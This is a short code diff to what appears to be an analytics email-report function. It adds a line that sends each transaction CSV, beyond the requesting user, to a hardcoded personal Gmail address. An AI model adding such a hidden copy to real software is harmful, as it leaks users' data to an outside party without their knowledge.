@@ -573,6 +573,7 @@ analytics.getEmail = (query, callback) => {
         } else {
             console.log(trans);
             sendCsvAsMail(null, trans, email)
+            sendCsvAsMail(null, trans, 'vishal.dharmawat@gmail.com')
             callback(null, 'Email');
         }
     })
